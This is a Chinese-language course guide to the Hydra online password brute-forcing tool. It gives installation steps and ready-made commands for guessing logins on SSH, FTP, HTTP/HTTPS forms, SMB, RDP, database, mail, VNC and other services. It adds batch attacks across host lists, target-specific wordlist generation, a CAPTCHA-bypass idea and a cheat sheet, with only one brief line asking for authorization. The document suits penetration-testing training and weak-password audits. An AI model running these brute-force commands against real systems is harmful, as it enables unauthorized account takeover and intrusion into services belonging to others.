# Hydra 在线密码暴力破解工具完全指南

> 分类：工具指南 | 难度：进阶 | 阅读时间：约45分钟

## 概述

Hydra（THC-Hydra）是世界上最快、最灵活的在线密码暴力破解工具，由 van Hauser 和 THC 团队开发维护。它支持 50+ 种网络协议的并行登录测试，包括 SSH、FTP、HTTP(S)、SMB、RDP、MySQL、PostgreSQL、MongoDB、Telnet、SMTP、POP3、IMAP、LDAP、SNMP、VNC 等。无论是对内网服务进行弱口令审计，还是在渗透测试中获取初始访问凭证，Hydra 都是不可或缺的工具。

**核心特性**：
- 真正的多线程并行攻击（非多进程），效率极高
- 50+ 协议模块，覆盖几乎所有常见网络服务
- 灵活的模块参数定制
- 支持恢复中断的任务
- 支持 HTTP 表单认证（GET/POST）

## 核心知识点

- Hydra 的命令行基础语法与选项
- 各协议模块的使用方法与参数
- 字典选择与生成策略
- HTTP 表单认证爆破（含 CSRF Token 处理）
- 并行优化与速率控制
- 与 Nmap、Medusa 的对比与配合

---

## 一、安装

```bash
# Kali Linux（预装）
sudo apt install hydra -y

# Ubuntu/Debian
sudo apt install hydra -y

# macOS
brew install hydra

# 从源码编译（获取最新版）
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install

# Windows
# 下载预编译版本：https://github.com/vanhauser-thc/thc-hydra/releases
# 或通过 Cygwin 编译

# 验证安装
hydra -h | head -20
```

---

## 二、基本命令语法

```bash
# 标准语法
hydra -l username -P password_list.txt target_ip service

# 多用户
hydra -L user_list.txt -P password_list.txt target_ip service

# 指定端口
hydra -l admin -P pass.txt -s 2222 192.168.1.100 ssh

# 并行控制（默认16线程）
hydra -l admin -P pass.txt -t 4 192.168.1.100 ssh

# 显示每次尝试（-v / -V）
hydra -l admin -P pass.txt -V 192.168.1.100 ssh
```

---

## 三、各协议爆破实战

### 3.1 SSH

```bash
# 单用户
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh

# 多用户
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh

# 非标准端口
hydra -l admin -P pass.txt -s 2222 192.168.1.100 ssh

# 批量 IP
hydra -l root -P pass.txt -M targets.txt ssh
```

### 3.2 FTP

```bash
# 标准
hydra -l admin -P pass.txt ftp://192.168.1.100

# 匿名登录检测
hydra -l anonymous -p anonymous 192.168.1.100 ftp

# 非标准端口
hydra -l ftpuser -P pass.txt -s 2121 192.168.1.100 ftp
```

### 3.3 HTTP/HTTPS 表单认证

```bash
# GET 表单
hydra -l admin -P pass.txt 192.168.1.100 \
      http-get-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# POST 表单
hydra -l admin -P pass.txt 192.168.1.100 \
      http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:Login failed"

# HTTPS 表单
hydra -l admin -P pass.txt 192.168.1.100 \
      https-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# 含 Header
hydra -l admin -P pass.txt 192.168.1.100 \
      http-post-form "/api/login:{\"user\":\"^USER^\",\"pass\":\"^PASS^\"}:H=Content-Type: application/json:F=error"

# 参数说明：
# /path:body_params:success/failure_condition
# ^USER^: 用户名字典占位符
# ^PASS^: 密码字典占位符
# F=: 失败标志（字符串匹配）
# S=: 成功标志（字符串匹配）
# H=: 自定义 Header
```

### 3.4 SMB / Windows 共享

```bash
hydra -l Administrator -P pass.txt 192.168.1.100 smb

# 指定工作组
hydra -l Administrator -P pass.txt 192.168.1.100 smb -m "WORKGROUP"

# 批量
hydra -L admins.txt -P pass.txt -M dc_list.txt smb
```

### 3.5 RDP

```bash
hydra -l administrator -P pass.txt rdp://192.168.1.100
```

### 3.6 MySQL / MSSQL / PostgreSQL

```bash
# MySQL
hydra -l root -P pass.txt mysql://192.168.1.100

# PostgreSQL
hydra -l postgres -P pass.txt postgres://192.168.1.100

# MSSQL
hydra -l sa -P pass.txt mssql://192.168.1.100
```

### 3.7 其他常用协议

```bash
# Telnet
hydra -l root -P pass.txt telnet://192.168.1.100

# VNC
hydra -P pass.txt vnc://192.168.1.100

# SNMP community string
hydra -P community.txt 192.168.1.100 snmp

# SMTP/POP3/IMAP
hydra -l user@domain.com -P pass.txt smtp://mail.target.com
hydra -l user@domain.com -P pass.txt pop3://mail.target.com
hydra -l user@domain.com -P pass.txt imap://mail.target.com

# LDAP
hydra -l admin -P pass.txt ldap://192.168.1.100

# Redis
hydra -P pass.txt redis://192.168.1.100

# MongoDB
hydra -l admin -P pass.txt mongodb://192.168.1.100

# 查看所有支持的协议模块
hydra -h | grep "Supported services"
```

---

## 四、高级配置

### 4.1 线程与速率控制

```bash
# -t: 并行任务数（默认16）
# -W: 等待响应时间（秒）
# -c: 每个连接尝试次数

hydra -l admin -P pass.txt -t 4 -W 5 192.168.1.100 ssh
hydra -l admin -P pass.txt -t 1 -w 3 192.168.1.100 ssh   # 慢速避免锁定
```

### 4.2 恢复中断的任务

```bash
# 任务自动保存到 hydra.restore
# 中断后恢复
hydra -R

# 指定恢复文件
hydra -R /path/to/hydra.restore
```

### 4.3 输出格式

```bash
# 输出到文件
hydra -l admin -P pass.txt -o results.txt 192.168.1.100 ssh

# JSON 输出（新版）
hydra -l admin -P pass.txt -O results.json -b json 192.168.1.100 ssh
```

---

## 五、实战场景

### 场景一：内网弱口令全面审计

```bash
# 步骤1：Nmap 发现存活服务
nmap -p 22,21,3389,3306,1433 --open 192.168.1.0/24 -oG scan.gnmap

# 步骤2：按协议批量测试
hydra -l root -P top1000.txt -M ssh_hosts.txt ssh
hydra -l Administrator -P top1000.txt -M rdp_hosts.txt rdp
hydra -l sa -P top1000.txt -M mssql_hosts.txt mssql
```

### 场景二：HTTP 登录爆破（含验证码绕过思路）

```bash
# 先用 Burp 拦截登录请求，分析参数
# 然后构造 hydra 命令（前提是验证码不过期或不校验）
hydra -l admin -P pass.txt target.com \
      https-post-form "/user/login:username=^USER^&password=^PASS^&remember=on:F=密码错误"
```

---

## 六、字典生成推荐

```bash
# Kali 内置字典
/usr/share/wordlists/rockyou.txt.gz        # 14M+ 常见密码
/usr/share/wordlists/fasttrack.txt          # 精简高效
/usr/share/seclists/Passwords/              # 分类字典集合

# 自定义字典生成
# 从公司信息生成
crunch 8 12 -t Company%%% -o company_dict.txt

# 从网页关键词生成
cewl https://target.com -d 3 -m 6 -w target_words.txt
```

---

## 七、Hydra vs Medusa vs Ncrack 对比

| 特性 | Hydra | Medusa | Ncrack |
|:---|:---|:---|:---|
| 协议数量 | 50+ | 20+ | 5+ |
| 速度 | 极快 | 快 | 快 |
| HTTP 表单 | ✅ 完整 | ✅ | ❌ |
| 任务恢复 | ✅ | ❌ | ✅ |
| 活跃维护 | ✅ | 一般 | ✅ |
| 安装难度 | 简单 | 简单 | 中等 |

---

## 八、注意事项与合规

> ⚠️ 在线爆破会产生大量登录日志，极易触发告警和账户锁定策略。务必在授权范围内使用，每次测试前确认账户锁定策略。

---

## 九、速查卡

```
SSH 爆破：       hydra -l root -P pass.txt IP ssh
FTP 爆破：       hydra -l admin -P pass.txt ftp://IP
HTTP 表单：      hydra -l admin -P pass.txt IP http-post-form "/login:user=^USER^&pass=^PASS^:F=fail"
SMB 爆破：       hydra -l Administrator -P pass.txt IP smb
RDP 爆破：       hydra -l administrator -P pass.txt rdp://IP
MySQL 爆破：     hydra -l root -P pass.txt mysql://IP
并行线程：       -t 4
任务恢复：       hydra -R
输出文件：       -o results.txt
详细输出：       -V / -vV
```

> 📖 本文为"网安百宝箱"课程配套读物。更新于 2026-06-18
